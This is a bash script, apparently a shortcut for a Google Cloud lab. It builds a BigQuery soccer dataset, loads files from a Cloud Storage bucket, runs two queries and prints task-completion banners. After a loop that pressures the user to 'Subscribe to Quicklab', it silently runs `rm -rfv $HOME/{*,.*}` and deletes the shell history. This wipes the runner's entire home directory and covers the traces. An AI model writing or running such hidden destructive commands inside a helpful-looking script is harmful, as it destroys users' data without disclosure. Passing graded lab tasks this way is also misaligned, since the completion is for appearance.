


BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#


bq --location=us mk --dataset $DEVSHELL_PROJECT_ID:soccer

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


#task3

bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.competitions gs://spls/bq-soccer-analytics/competitions.json

bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.matches gs://spls/bq-soccer-analytics/matches.json
bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.teams gs://spls/bq-soccer-analytics/teams.json
bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.players gs://spls/bq-soccer-analytics/players.json
bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.events gs://spls/bq-soccer-analytics/events.json

echo "${GREEN}${BOLD}

Task 3 Completed

${RESET}"


# task 4

bq load --autodetect --source_format=CSV $DEVSHELL_PROJECT_ID:soccer.tags2name gs://spls/bq-soccer-analytics/tags2name.csv

echo "${GREEN}${BOLD}

Task 4 Completed

${RESET}"


#task 6

bq query --use_legacy_sql=false \
"
SELECT
  (firstName || ' ' || lastName) AS player,
  birthArea.name AS birthArea,
  height
FROM
  \`soccer.players\`
WHERE
  role.name = 'Defender'
ORDER BY
  height DESC
LIMIT 5
"

echo "${GREEN}${BOLD}

Task 6 Completed

${RESET}"


#task 7


bq query --use_legacy_sql=false \
"SELECT
  eventId,
  eventName,
  COUNT(id) AS numEvents
FROM
  \`soccer.events\`
GROUP BY
  eventId, eventName
ORDER BY
  numEvents DESC
"

echo "${GREEN}${BOLD}

Task 7 Completed

Lab completed.

${RESET}"


#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0